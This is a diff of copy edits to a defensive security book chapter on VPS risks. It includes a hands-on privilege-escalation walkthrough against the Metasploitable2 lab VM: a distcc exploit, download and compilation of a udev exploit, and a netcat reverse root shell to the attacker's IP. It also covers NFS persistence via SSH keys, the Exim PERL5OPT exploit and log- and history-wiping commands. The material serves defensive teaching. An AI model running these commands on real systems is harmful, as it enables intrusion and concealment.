-This adds the `suid` bit, read, write and execute for `owner`, read and execute for `group` and no permissions for `other`. This is just to give you an idea of the relevance of the `4` in the above `-4000`, do not go setting the `suid` bits on files unless you fully understand what you are doing, and have good reason to. This could introduce a security flaw, and if the file is owned by root, you may have just added a perfect vulnerability for an attacker to elevate their privileges to root due to a defect in your executable or the fact that the file can be modified/replaced.
+This adds the `suid` bit, read, write and execute for `owner`, read and execute for `group` and no permissions for `other`. This is just to give you an idea of the relevance of the `4` in the above `-4000`, do not set the `suid` bits on files unless you fully understand what you are doing, and have good reason to do so. Doing so could introduce a security flaw, and if the file is owned by root, you may have just added a perfect vulnerability for an attacker to elevate their privileges to root due to a defect in your executable, or the fact that the file can be modified/replaced.
 
-So for example if root owns a file and the file has its `suid` bit set, anyone can run that file as root.
+For example, if root owns a file and the file has its `suid` bit set, anyone can run that file as root.
 
 ![](images/HandsOnHack.png)
 
-We will now walk through the steps of how an attacker may carry out a privilege escalation.
+We will now walk through the attacker's steps to carry out a privilege escalation.
 
-You can find the video of how it is played out at [https://youtu.be/ORey5Zmnmxo](https://youtu.be/ORey5Zmnmxo).
+You can find the video of how this is played out at [https://youtu.be/ORey5Zmnmxo](https://youtu.be/ORey5Zmnmxo).
 
 I> ## Synopsis
 I>
 I> First we carry out some reconnaissance on our target machine. I am using Metasploitable2 for this play.  
-I> We find a suitable open port with a defective service listening, that is our Vulnerability Scanning / Discovery stage.  
+I> We find a suitable open port with a defective service listening, this is the Vulnerability Scanning / Discovery stage.  
 I> We then search for an exploit that may be effective at giving us at least low privilege access to the machine.  
 I> We then use the tools I have just discussed above to help us find possible writeable, executable directories and/or files.  
-I> We then search for exploits that may help us escalate our privileges, based on an area in the file system that we now know we have write and execute permissions on.  
+I> We then search for exploits that may help us escalate our privileges, based on a part of the file system that we now know we have write and execute permissions on.  
 I> We then walk through understanding a chosen exploit and preparing it to be run.
 
 {icon=bomb}
@@ -822,7 +821,7 @@ G>
 G> A simple nmap scan will show us any open ports.  
 G> One of the ports is 3632, with the `distcc` (distributed compiler, useful for speeding up source code compilation) daemon listening.  
 G>
-G> Let us check to see if Metasploit knows about any `distcc` exploits?
+G> Let's check to see if Metasploit is aware of any `distcc` exploits.
 G>
 G> 
 G> `msfconsole`  
@@ -831,9 +830,9 @@ G> `msf > search distcc`
 G> `msf > use exploit/unix/misc/distcc_exec`  
 G> `msf exploit(distcc_exec) > set RHOST metasploitable`  
 G> `msf exploit(distcc_exec) > exploit`  
-G> In the video metasploitable was running at 192.168.56.21 for starters. After this I had to change the virtual adapter, so that it could also connect to the outside world to fetch my payload. It ended up running on 192.168.0.232. My attacking machine also changed from 192.168.56.20 to 192.168.0.12
+G> In the video metasploitable was running at 192.168.56.21. Afterwards, I had to change the virtual adapter, so that it could also connect to the outside world to fetch my payload. It ended up running on 192.168.0.232. My attacking machine also changed from 192.168.56.20 to 192.168.0.12
 G>
-G> Now we have a shell. Let us test it.
+G> Now we have a shell, let'S test it.
 G>
 G> `pwd`  
 G> `/tmp`  
@@ -850,44 +849,44 @@ G>
 G> `mount`  
 G> Shows us that we have very little in the way of granular partitioning and we have `/` mounted as `rw`, so as a low privileged user, we can both write and execute files in `/tmp` for example.  
 G>
-G> We could also just search for "Privilege Escalation" exploits targeting our targets kernel.  
-G> Let us get the targets Kernel version: `uname -a` produces:  
+G> We could also just search for "Privilege Escalation" exploits targeting our target's kernel.  
+G> Echo the target's kernel version: `uname -a` produces:  
 G> `2.6.24`
 G>
-G> This ([https://www.exploit-db.com/exploits/8572/](https://www.exploit-db.com/exploits/8572/)) looks like an interesting one. Can we compile this on the target though? Let us see if we have `gcc` handy:  
+G> This ([https://www.exploit-db.com/exploits/8572/](https://www.exploit-db.com/exploits/8572/)) looks like an interesting target. Can we compile this on the target though? Do we have `gcc` handy:  
 G> `dpkg -l gcc`  
 G> We do.
 
 {icon=bomb}
 G>
 G> udev is a device manager running as root for the Linux kernel. Before version 1.4.1 it did not verify whether a netlink message originated from kernel or user space,  
-G> which allowed users to supply their own, which we see in the exploit:  
+G> which allowed users to supply their own, as seen in the exploit:  
 G> `sendmsg(sock, &msg, 0);`
 G>
-G> The exploit will run our payload that we will create soon which will open a reverse root shell (because udev is running as root) back to our attacking box.  
+G> This exploit will run the payload that we will create momentarily, which will open a reverse root shell (because udev is running as root) back to our attacking box.  
 G> We need to pass the PID of the netlink socket as an argument.  
-G> When a device is removed, the exploit leverages the `95-udev-late.rules` functionality which runs arbitrary commands (which we are about to create in `/tmp/run`) via the `REMOVE_CMD` in the exploit.  
-G> You can also see within the exploit that it adds executable permissions to our reverse shell payload. Now if we had `/tmp` mounted as we do in the `/etc/fstab` in the Countermeasures section, neither `/tmp/run` or `/tmp/privesc` would be able to execute.  
+G> When a device is removed, the exploit leverages the `95-udev-late.rules` functionality, which runs arbitrary commands (which we are about to create in `/tmp/run`) via the `REMOVE_CMD` in the exploit.  
+G> You can also see within the exploit that it adds executable permissions to our reverse shell payload. If only we had `/tmp` mounted as we do in the `/etc/fstab` in the Countermeasures section, neither `/tmp/run` or `/tmp/privesc` would be able to execute.  
 G>
-G> Through our daemon shell that `distcc_exec` provided, let us fetch the exploit:  
+G> Through our daemon shell that `distcc_exec` provided, let's fetch the exploit:  
 G> `wget --no-check-certificate https://www.exploit-db.com/download/8572 -O privesc.c`  
-G> The `no-check` is required because metasploitable does not have the relevant CA cert installed.  
+G> The `no-check` is required because Metasploit does not have the relevant CA cert installed.  
 G> Now check that the file has the contents that you expect.  
 G> `cat privesc.c`
 G>
-G> Let us compile it:  
+G> Compile it:  
 G> `gcc privesc.c -o privesc`  
 G> `ls -liah`  
 G> `privesc`
 G>
-G> Now we need the PID of the udevd netlink socket  
+G> We need the PID of the udevd netlink socket  
 G> `cat /proc/net/netlink`  
-G> Gives us `2299`  
+G> gives us `2299`  
 G> And to check:  
 G> `ps -aux | grep udev`  
-G> Gives us `2300` which should be one more than netlink.
+G> gives us `2300` which should be one more than netlink.
 G>
-G> Now we need something on the target to use to open a reverse shell. Netcat may not be available on a production web server, but if it is:  
+G> We need something on the target to use to open a reverse shell. Netcat may not be available on a production web server, but if it is:  
 G> Open a connection to 192.168.0.12:1234, then run `/bin/bash`  
 G> `echo '#!/bin/bash' > run`  
 G> `echo '/bin/netcat -e /bin/bash 192.168.0.12 1234' >> run`  
@@ -910,9 +909,9 @@ G> `connect to [192.168.0.12] from metasploitable [192.168.0.232] 43542`
 G> `whoami`  
 G> `root`
 G>
-G> and that is our privilege escalation, we now have root.
+G> That is our privilege escalation, we now have root.
 
-The Countermeasures sections that address are:
+The Countermeasures sections that address this are:
 
 1. [Partitioning on OS Installation](#vps-countermeasures-disable-remove-services-harden-what-is-left-partitioning-on-os-installation)
 2. [Lock Down the Mounting of Partitions](#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions), which also briefly touches on the improving file permissions and ownership
@@ -920,29 +919,29 @@ The Countermeasures sections that address are:
 #### Weak Password Strategies
 ![](images/ThreatTags/difficult-common-average-severe.png)
 
-This same concept was covered in the People chapter of Fascicle 0, which also applies to VPS. In addition to that, the risks are addressed within the [countermeasures](#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies) section.
+This same concept was covered in the People chapter of Fascicle 0, which also applies to VPS. In addition, the risks are addressed within the [countermeasures](#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies) section.
 
 #### Root Logins
 ![](images/ThreatTags/average-common-average-severe.png)
 
-Allowing root logins is a lost opportunity for another layer of defence in depth, where the user must elevate privilages before performaning any task that could possibly negativly impact the system. Once an attacker is root on a system, the system is owned by them. Root is a user and no guess work is required for that username. Other low privilaged users require some guess work on the part of the username as well as the password, and even once both parts of a low privaleged credential have been aquired, there is another step to total system ownership.
+Allowing root logins is another lost layer of defence in depth, where the user must elevate priviliges before performing any task that could adversely affect the system. Once an attacker is root on a system, the system is owned, plain and simple. Root is a user afterall, and no guess work is required to take full advantage. Other low priviliged users require some guess work on the part of the username, as well as the password. Even once both parts of a low priviliged credential have been aquired, there is another step to total system ownership (escalation).
 
 #### SSH
 ![](images/ThreatTags/difficult-uncommon-average-moderate.png)
 
-You may remember we did some fingerprinting of the SSH daemon in the Reconnaissance section of the Processes and Practises chapter in [Fascicle 0](https://leanpub.com/holistic-infosec-for-web-developers). SSH in itself has been proven to be solid. In saying that, SSH is only as strong as the weakest link involved. For example, if you are using the default of password authentication and have not configured which remote hosts can or can not access the server, and chose to use a weak password, then your SSH security is only as strong as the password. There are many configurations that a default install of SSH uses in order to get up and running quickly, that need to be modified in order to harden SSH. Using SSH in this manner can be convienient initially, but it is always recommended to move from the defaults to a more secure model of usage. I cover many techniques for configuring and hardening SSH in the [SSH Countermeasures](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh) section.
+You may remember we did some fingerprinting of the SSH daemon in the Reconnaissance section of the Processes and Practises chapter in [Fascicle 0](https://leanpub.com/holistic-infosec-for-web-developers). SSH, in and of itself, has been proven to be solid. In saying that, SSH is only as strong as the weakest link involved. For example, if you are using password authentication as default, and have not configured which remote hosts are allowed to access the server, and used a weak password, then your SSH security is hosed. There are many configurations that a default SSH installation uses in order to get up and running quickly, but they need to be modified in order to harden the SSH daemon. Using SSH in this manner can be convienient initially, but it is always recommended to move from defaults to a more secure implementation. I cover many techniques for configuring and hardening SSH in the [SSH Countermeasures](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh) section.
 
-#### To Many Boot Options
+#### Too Many Boot Options
 ![](images/ThreatTags/difficult-uncommon-difficult-severe.png)
 
-Being able to boot from alternative media to that of your standard OS, provides additional opportunity for an attacker to install a root-kit on your machine, whether it be virtual or real media.
+The ability to boot from alternative media to your installed OS provides additional opportunity for an attacker to install a root-kit on your system, whether it be virtual, or real media.
 
 #### Portmap {#vps-identify-risks-unnecessary-and-vulnerable-services-portmap}
 ![](images/ThreatTags/easy-common-easy-moderate.png)
 
-An attacker can probe the Open Network Computing Remote Procedure Call (ONC RPC) port mapper service on the target host, where the target host is an IP address or a host name.
+An attacker can probe the Open Network Computing Remote Procedure Call (ONC RPC) port mapper service on the target host via an IP address or a host name.
 
-If installed, the `rpcinfo` command with `-p` will list all RPC programs (such as `quotad`, `nfs`, `nlockmgr`, `mountd`, `status`, etc) registered with the port mapper (whether the depricated `portmap` or the newer `rpcbind`). Many RPC programs are vulnerable to a collection of attacks. 
+If installed, the `rpcinfo` command with `-p` will list all RPC programs (such as `quotad`, `nfs`, `nlockmgr`, `mountd`, `status`, etc) registered with the port mapper (whether the deprecated `portmap` or the newer `rpcbind`). Many RPC programs are vulnerable to a variety of attacks. 
 
 {title="rpcinfo", linenos=off, lang=bash}
     rpcinfo -p <target host> 
@@ -977,13 +976,13 @@ If installed, the `rpcinfo` command with `-p` will list all RPC programs (such a
     100021    4   udp    679  nlockmgr
     100021    4   tcp    875  nlockmgr
 
-This provides a list of RPC services running that have registered with the port mapper, thus providing an attacker with a lot of useful information to take into the Vulnerability Searching stage discussed in the Process and Practises chapter of [Fascicle 0](https://leanpub.com/holistic-infosec-for-web-developers).
+This provides a list of RPC services running that have registered with the port mapper, thus providing an attacker with a lot of useful information to use in the Vulnerability Searching stage as discussed in the Process and Practises chapter of [Fascicle 0](https://leanpub.com/holistic-infosec-for-web-developers).
 
-The deprecated `portmap` service as well as the newer `rpcbind`, listen on port 111 for requesting clients, some Unix and Solaris versions will also listen on ports above 32770.
+The deprecated `portmap` service, as well as the newer `rpcbind`, listen on port 111 for requesting clients, some Unix and Solaris versions will also listen on ports above 32770.
 
-Besides providing the details of RPC services, `portmap` and `rpcbind` are inherently vulnerable to DoS attacks, specifically reflection and amplification attacks, in fact that is why. Clients make a request and the port mapper will respond with all the RPC servers that have registered with it, thus the response is many times larger than the request. This serves as an excellent vector for DoS, saturating the network with amplified responses.
+In addition to providing the details of RPC services, `portmap` and `rpcbind` are inherently vulnerable to DoS attacks, specifically reflection and amplification attacks. Clients make a request and the port mapper will respond with all the RPC servers that have registered with it, thus the response is many times larger than the request. This serves as an excellent vector for DoS, saturating the network with amplified responses.
 
-These types of attacks have become very popular amongst distributed attackers due to their significant impact, lack of sophistication and ease of execution. Level 3 Threat Research Labs published a [blog post](http://blog.level3.com/security/a-new-ddos-reflection-attack-portmapper-an-early-warning-to-the-industry/) on this port mapper DoS attack and how it has become very popular since the beginning of August 2015.  
+These types of attacks have become very popular due to their significant impact, as well as a lack of sophistication and ease of execution. Level 3 Threat Research Labs published a [blog post](http://blog.level3.com/security/a-new-ddos-reflection-attack-portmapper-an-early-warning-to-the-industry/) on this port mapper DoS attack, and it's popularity as of August 2015.  
 US-CERT also published an [alert](https://www.us-cert.gov/ncas/alerts/TA14-017A) on UDP-Based Amplification Attacks outlining the Protocols, Bandwidth Amplification Factor, etc.
 
 {title="rpcinfo", linenos=off, lang=bash, id=vps-identify-risks-unnecessary-and-vulnerable-services-portmap-rpcinfo-t}
@@ -1014,47 +1013,45 @@ US-CERT also published an [alert](https://www.us-cert.gov/ncas/alerts/TA14-017A)
     100005    3    tcp       0.0.0.0.182.4          mountd     unknown
     100000    2    udp       0.0.0.0.0.111          portmapper unknown
 
-You will notice in the response as recorded by Wireshark, that the length is many times larger than the request, 726 bytes in this case, hence the reflected amplification:
+You will notice in the response, as recorded by Wireshark, that the length is many times larger than the request, 726 bytes in this case, hence the reflected amplification:
 
 {title="wireshark results", linenos=off, lang=bash}
     Source      Destination Protocol Length Info
     <source IP> <dest IP>   Portmap  82     V3 DUMP Call (Reply In 76)
     <dest IP>   <source IP> Portmap  726    V3 DUMP Reply (Call In 75)
 
-The packet capture in Wireshark which is not showen here also confirms that it is UDP.
-
 #### EXIM
 ![](images/ThreatTags/difficult-uncommon-difficult-moderate.png)
 
-Exim, along with offerings such as Postfix, Sendmail, Qmail, etc, are Mail Transfer Agents (MTAs), which on a web server are probably not required.
+Exim, along with offerings such as Postfix, Sendmail, Qmail, etc., are Mail Transfer Agents (MTAs) which, on a web server, are probably not required.
 
-There have been plenty of exploits created for Exim security defects. Most of the defects I have seen have patches for, so if Exim is a necessity, stay up to date with your patching. If you are still on a stable (jessie at the time of writing) and can not update to a testing release, make sure to use backports.
+There have been plenty of exploits created for Exim security defects. Most of these defects are patched, so if Exim is a necessity, stay up to date. If you are still on a stable build (jessie at the time of writing) and can not update to a testing release, make sure to use backports.
 
-At the time of writing this, the very front page of the [Exim website](www.exim.org) states "All versions of Exim previous to version 4.87 are now obsolete and everyone is very strongly recommended to upgrade to a current release.".
+At the time of this writing, the front page of the [Exim website](www.exim.org) states that "All versions of Exim previous to version 4.87 are now obsolete and everyone is very strongly recommended to upgrade to a current release.".
 
-Jessie (stable) uses Exim 4.84.2 where as jessie-backports uses Exim 4.87,  
-which 4.86.2 was patched for the likes of [CVE-2016-1531](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1531). Now if we have a look at the first exploit for this vulnerability ([https://www.exploit-db.com/exploits/39535/](https://www.exploit-db.com/exploits/39535/)) and dissect it a little:
+Jessie (stable) uses Exim 4.84.2 where as jessie-backports uses Exim 4.87.  
+Exim 4.86.2 was patched for the likes of [CVE-2016-1531](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1531). If we have a look at the first exploit for this vulnerability ([https://www.exploit-db.com/exploits/39535/](https://www.exploit-db.com/exploits/39535/)), and dissect it a little:
 
 The Perl shell environment variable `$PERL5OPT` can be assigned  options, these options will be interpreted as if they were on the `#!` line at the beginning of the script. These options will be treated as part of the command run, after any optional switches included on the command line are accepted. 
 
-`-M`, which is one of the allowed switches (`-`[`DIMUdmw`]) to be used with `$PERL5OPT` allows us to attempt to use a module from the command line, so with `-Mroot` we are trying to use the `root` module, then `PERL5OPT=-Mroot` effectively puts `-Mroot` on the first line like the following, which runs the script as root:
+`-M`, which is one of the allowed switches (`-`[`DIMUdmw`]) to be used with `$PERL5OPT` allows us to attempt to use a module from the command line, with `-Mroot` we are trying to use the `root` module, then `PERL5OPT=-Mroot` effectively puts `-Mroot` on the first line as follows, which runs the script as root:
 
 `#!perl -Mroot` 
 
 The Perl shell environment variable `$PERL5LIB` is used to specify a colon (or semicolon on Windows) separated list of directories in which to look for Perl library files before looking in the standard library and the current directory.
 
-Assigning `/tmp` to `$PERL5LIB` immediately before the exploit is run, means the first place execution will look for the root module is in the `/tmp` directory.
+Assigning `/tmp` to `$PERL5LIB` immediately before the exploit is run causes the first execution for the root module to occur from the `/tmp` directory.
 
 #### NIS {#vps-identify-risks-unnecessary-and-vulnerable-services-nis}
 ![](images/ThreatTags/difficult-uncommon-difficult-moderate.png)
 
 **Some History**:
 
-NIS+ was introduced as part of Solaris 2 in 1992 with the intention that it would eventually replace Network Information Service (NIS), originally known as Yellow Pages (YP). NIS+ featured stronger security, authentication, greater scalability and flexibility, but it was more difficult to set up, administer and migrate to, so many users stuck with NIS. NIS+ was removed from Solaris 11 at the end of 2012. Other more secure distributed directory systems such as Lightweight Directory Access Protocol (LDAP) have come to replace NIS(+).
+NIS+ was introduced as part of Solaris 2 in 1992 with the intention of replacing Network Information Service (NIS), originally known as Yellow Pages (YP). NIS+ featured stronger security, authentication, greater scalability and flexibility, but it was more difficult to set up, administer and migrate to, so many users stuck with NIS. NIS+ was removed from Solaris 11 at the end of 2012. Other more secure distributed directory systems such as Lightweight Directory Access Protocol (LDAP) have come to replace NIS(+).
 
 **What NIS is**:
 
-NIS is a Remote Procedure CAll (RPC) client/server system and a protocol providing a directory service, letting many machines in a network share a common set of configuration files with the same account information, such as the commonly local stored UNIX:
+NIS is a Remote Procedure CAll (RPC) client/server system and a protocol providing a directory service, letting many networked machines share a common set of configuration files with the same account information, such as the commonly local stored UNIX:
 
 * users
 * their groups
@@ -1063,7 +1060,7 @@ NIS is a Remote Procedure CAll (RPC) client/server system and a protocol providi
 * etc
 * and contents of the `/etc/passwd` and referenced `/etc/shadow` which contains the hashed passwords, discussed in detail under the [Review Password Strategies](#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies) section
 
-The NIS master server maintains canonical database files called maps. We also have slave servers which have copies of these maps. Slave servers are notified by the master via the `yppush` program when any changes to the maps occur. The slaves then retrieve the changes from the master in order to synchronise their own maps. The NIS clients always communicate directly with the master, or a slave if the master is down or slow. Both master and slave(s) service all client requests through `ypserv`.
+The NIS master server maintains canonical database files called maps. There are also slave servers which have copies of these maps. Slave servers are notified by the master via the `yppush` program when any changes to the maps occur. The slaves then retrieve the changes from the master in order to synchronise their own maps. The NIS clients always communicate directly with the master, or a slave if the master is down or slow. Both master and slave(s) service all client requests through `ypserv`.
 
 **Vulnerabilities and exploits**:
 
@@ -1085,30 +1082,30 @@ NIS can run on unprivileged ports, which means that any user on the system(s) ca
 
 Provides a command line interface on a remote server via its application layer client-server protocol traditionally to port 23. Telnet was created and launched in 1969, provides no encryption, credentials are sent in plain text. There have been extensions to the Telnet protocol which provide Transport Layer Security (TLS) and Simple Authentication and Security Layer (SASL), many Telnet implementations do not support these though.
 
-Telnet is still provided turned on, on many cheap hardware appliances, which continue to provide an excellent source of ownable resources for those looking to acquire computing devices illegally to launch attacks from. Many of these devices also never have their default credentials changed.
+Telnet is still often enabled by default on many cheap hardware appliances, which continue to provide an excellent source of ownabilityfor those looking to acquire computing devices illegally in order to launch attacks. Many of these devices also never have their default credentials changed.
 
 #### FTP
 ![](images/ThreatTags/easy-widespread-average-moderate.png)
 
-The FTP protocol was [not designed with security in mind](https://archive.fo/KyJUa), it does not use any form of encryption. The credentials you use to authenticate, all of your traffic including any sensitive information you have in the files that you send or receive, to or from the FTP server, will all be on the wire in plain text. Even if you think your files do not contain any sensitive information, often there will be details hiding, for example, if you are `[m]put`ting / `[m]get`ing source files, there could be database credentials or other useful bits of information in config files.
+The FTP protocol was [not designed with security in mind](https://archive.fo/KyJUa), it does not use any form of encryption. The credentials you use to authenticate, all of your traffic, including any sensitive information you have in the files that you send or receive, to or from the FTP server, will all be on the wire in plain text. Even if you think your files do not contain any sensitive information, often there will be details hiding, for example, if you are `[m]put`ting / `[m]get`ing source files, there could be database credentials or other useful bits of information in config files.
 
 Many people have been using FTP for years, in many cases never even considering the fact that FTP adds no privacy to anything it touches.
 
-Most FTP clients also store the users credentials in plain text, completely neglecting to consider defence in depth. It should be considered that your client machine is already compromised. If credentials are stored encrypted, then it is one more challenge that an attacker must conquer. All software created with security in mind realises this, and if they must store credentials, they will be hashed via a best of bread KDF (as discussed in the [Data-store Compromise](#web-applications-countermeasures-data-store-compromise) section of the Web Applications chapter) with the recommended number of iterations (as discussed in the [Review Password Strategies](#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies) section a little later in this chapter). In regards to FTP, the clients are designed to store multiple credentials, one set for each site, the idea being that you don't have to remember them, so they need to be encrypted, rather than hashed (one way, not reversible), so they can be decrypted.
+Most FTP clients also store the users credentials in plain text, completely neglecting defence in depth. It should be considered that your client machine is already compromised. If credentials are stored encrypted, then it is one more challenge that an attacker must conquer. All software created with security in mind realises this, and, if they must store credentials, they will be hashed via a best of breed KDF (as discussed in the [Data-store Compromise](#web-applications-countermeasures-data-store-compromise) section of the Web Applications chapter) with the recommended number of iterations (as discussed in the [Review Password Strategies](#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies) section a little later in this chapter). Regarding FTP, clients are designed to store multiple credentials, one set for each site. For the convenience of not having to remember them, they need to be encrypted, rather than hashed (one way, not reversible), so they can be decrypted.
 
 A couple of the most popular clients are:
 
-**FileZilla** (cross platform) FTP client stores your credentials in plain text. Yes, the UI conceals your password from shoulder surfers, but that is the extent of its security, basically none.
+**FileZilla** (cross platform) FTP client stores your credentials in plain text. Yes, the UI conceals your password from shoulder surfers, but that is the extent of its security, equating to none.
 
-**WinSCP** (Windows) is a FTP, [SFTP](#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-ftp-sftp) and [SCP](#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-ftp-scp) client for Windows. WinSCP has a number of ways in which you can have it deal with passwords. [By default](https://winscp.net/eng/docs/security_credentials), when a user enters their password on the authentication window, it is stored in memory and reused for all subsequent authentications during the same session. This is of course open to exploitation as is, also in-memory data can be swapped to disk, written to crash dump files and accessed by malware.
+**WinSCP** (Windows) is an FTP, [SFTP](#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-ftp-sftp) and [SCP](#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-ftp-scp) client for Windows. WinSCP includes a number of ways in which you can manage passwords. [By default](https://winscp.net/eng/docs/security_credentials), when a user enters their password in the authentication window, it is stored in memory, and reused for all subsequent authentications during the same session. This subjects credentials to memory enumeration exploitation, in-memory data can be swapped to disk, written to crash dump files and accessed by malware.
 
-Another option is to store passwords along with other site specific configurations to the registry for installed WinSCP, or to an INI file (overridable) for the portable version. These passwords are stored obfuscated, as the documentation puts it "[_stored in a manner that they can easily be recovered_](https://winscp.net/eng/docs/security_credentials)". If you are interested, you can check the `EncryptPassword` function on the WinSCP [github](https://github.com/mirror/winscp/blob/master/source/core/Security.cpp#L34) mirror, in which a short and simple set of bitwise operations are performed on each character of the password and the user and host are concatenated as what looks to be some sort of pseudo-salt. Although this option exists, it is [recommended against](https://winscp.net/eng/docs/faq_password).
+Another option is to store passwords along with other site specific configurations to the registry for installed instances of WinSCP, or to an INI file (can be overidden) for the portable version. These passwords are stored obfuscated, as the documentation puts it "[_stored in a manner that they can easily be recovered_](https://winscp.net/eng/docs/security_credentials)". If you are interested, you can check the `EncryptPassword` function on the WinSCP [github](https://github.com/mirror/winscp/blob/master/source/core/Security.cpp#L34) mirror, in which a short and simple set of bitwise operations are performed on each character of the password, and the user and host are concatenated for what looks to be some sort of pseudo-salt. Although this option exists, it is not [recommended](https://winscp.net/eng/docs/faq_password).
 
-And here is why. The [exploit](https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/parser/winscp.rb#L81) `decrypt_password` consumed by the [`winscp`](https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/winscp.rb#L82) [metasploit module](https://www.rapid7.com/db/modules/post/windows/gather/credentials/winscp). Additional details on the [cosine-security blog](https://cosine-security.blogspot.co.nz/2011/04/stealing-winscp-saved-passwords.html).
+Here is why. The [exploit](https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/parser/winscp.rb#L81) `decrypt_password` is consumed by the [`winscp`](https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/winscp.rb#L82) [metasploit module](https://www.rapid7.com/db/modules/post/windows/gather/credentials/winscp). See additional details on the [cosine-security blog](https://cosine-security.blogspot.co.nz/2011/04/stealing-winscp-saved-passwords.html).
 
-The recommended way to store the site specific passwords is to use a Master Password. This appears to use a [custom implementation](https://github.com/mirror/winscp/blob/master/source/core/Cryptography.cpp) of the AES256 block cipher, with a hard-coded 1000 rounds of SHA1.
+The recommended way to store site-specific passwords is to use a Master Password. This appears to use a [custom implementation](https://github.com/mirror/winscp/blob/master/source/core/Cryptography.cpp) of the AES256 block cipher, with a hard-coded 1000 rounds of SHA1.
 
-WinSCP provides a lot of options, which may or may not be a good thing.
+WinSCP provides a lot of options, if configured properly it can be securely implemented, but it can also be left quite vulnerable.
 
 #### NFS
 ![](images/ThreatTags/average-uncommon-average-moderate.png)
@@ -1126,10 +1123,10 @@ If the `mountd` daemon is listed in the output of the above `rpcinfo` command, t
     Export list for <target hsot>:
     / (anonymous) # If you're lucky as an attacker, anonymous means anyone can mount.
     / * # means all can mount the exported root directory.
-    # Probably because the hosts.allow has ALL:ALL and hosts.deny is blank.
-    # Which means all hosts from all domains are permitted access.
+    # Likely because the hosts.allow has ALL:ALL and hosts.deny is blank.
+    # Which translates to all hosts from all domains are permitted access.
 
-NFS is one of those protocols that you need to have some understanding on in order to achieve a level of security sufficient for your target environment. NFS provides no user authentication, only host based authentication. NFS relies on the AUTH_UNIX method of authentication, the user ID (UID) and group ID (GIDs) that the NFS client passes to the server are implicitly trusted.
+NFS is one of those protocols that you need to have some understanding of in order to achieve a level of security sufficient for your target environment. NFS provides no user authentication, only host based authentication. NFS relies on the AUTH_UNIX method of authentication, the user ID (UID) and group ID (GIDs) that the NFS client passes to the server are implicitly trusted.
 
 {title="mount nfs export", linenos=off, lang=bash}
     # Make sure local rpcbind service is running:
@@ -1139,7 +1136,7 @@ NFS is one of those protocols that you need to have some understanding on in ord
     service rpcbind start
     mount -t nfs <target host>:/ /mnt
 
-All going well for the attacker, they will now have your VPS's `/` directory mounted to their `/mnt` directory. If you have not setup NFS properly, they will have full access to your entire file system.
+If all goes well for the attacker, they will now have your VPS's `/` directory mounted to their `/mnt` directory. If you have not setup NFS properly, they will have full access to your entire file system.
 
 To establish some persistence, an attacker may be able to add their SSH public key:
 
@@ -1148,65 +1145,65 @@ To establish some persistence, an attacker may be able to add their SSH public k
 
 The NFS daemon always listens on the unprivileged port 2049. An attacker without root privileges on a system can start a trojanised `nfsd` which will be bound to port 2049.
 
-* On a system that does not usually offer NFS, the attacker could then proceed to create a spear phishing attack, in which they lure the target to open a pdf or similar from the exported filesystem, or even using a fake ([pickled](https://github.com/micheloosterhof/cowrie/blob/master/data/fs.pickle)) filesystem. As the export(s) would probably be on an internal network, target trust levels would be very high, or...
-* If they can find a way to stop an existing `nfsd` and run their own, clients may communicate with the trojanised `nfsd` and possibly consume similar exports. By replacing a NFS daemon with a trojanised replica, the attacker would also have access to the resources that the legitimate daemon controls.
+* On a system that does not usually offer NFS, the attacker could then proceed to create a spear phishing attack, in which they convince the target to open a PDF or similar from the exported filesystem, or even use a fake ([pickled](https://github.com/micheloosterhof/cowrie/blob/master/data/fs.pickle)) filesystem. As the export(s) would probably be on an internal network, target trust levels would be very high, or...
+* If they can find a way to stop an existing `nfsd` and run their own daemon, clients may communicate with the trojanised `nfsd` and possibly consume similar exports. By replacing an NFS daemon with a trojanised replica, the attacker would also have access to the resources that the legitimate daemon controls.
 
 The ports that a Linux server will bind its daemons to are listed in `/etc/services`.
 
-As well as various privilege escalation vulnerabilities, NFS has also suffered from various buffer overflow vulnerabilities.
+In addition to various privilege escalation vulnerabilities, NFS has also suffered from various buffer overflow vulnerabilities.
 
 ### Lack of Visibility {#vps-identify-risks-lack-of-visibility}
 ![](images/ThreatTags/average-common-difficult-moderate.png)
 
-As I was writing this section, I realised that visibility is actually an asset, so I went back and added it... actually to several chapters. Without visibility, an attacker can do a lot more damage than they could if you were watching them and able to react, or even if you have good auditing capabilities. It is in fact an asset that attackers often try and remove for this very reason.
+As I was writing this section, I realised that visibility for defenders is itself an asset, so I went back and added it to several chapters. Without the worry of being observed, an attacker can do a lot more damage than they could if you were watching them and able to react, or even if you have good auditing capabilities. It is in fact an asset that attackers try deny defenders of and remove for this very reason.
 
 Any attacker worth their weight will try to [cover their tracks](https://www.win.tue.nl/~aeb/linux/hh/hh-13.html) as they progress. Once an attacker has shell access to a system, they may:
 
-* Check running processes to make sure that they have not left anything they used to enter still running
+* Check running processes to make sure that they have not left anything they used to gain access still running
 * Remove messages in logs related to their break (walk) in
-* Same with the shell history file. Or even:  
+* Alter or remove the shell history file. Or even:  
   `ln /dev/null ~/.bash_history -sf` so that all following history vanishes.
 * They may change time stamps on new files with:  
   `touch -r <referenceFile> <fileThatGetsReferenceFileTimeStampsApplied>`  
-  Or better is to use the original date-time:
+  Or they may use the original date-time:
 
     {linenos=off}
         touch -r <originalFile> <trojanFile>
         mv <trojanFile> <originalFile>
 
 * Make sure any trojan files they drop are the same size as the originals
-* Replace `md5sum` so that it contains sums for the files that were replaced including itself. Although if an administrator ran `rpm -V` or `debsums -c` (Debian, Ubuntu) it would not be affected by a modified `md5sum`.
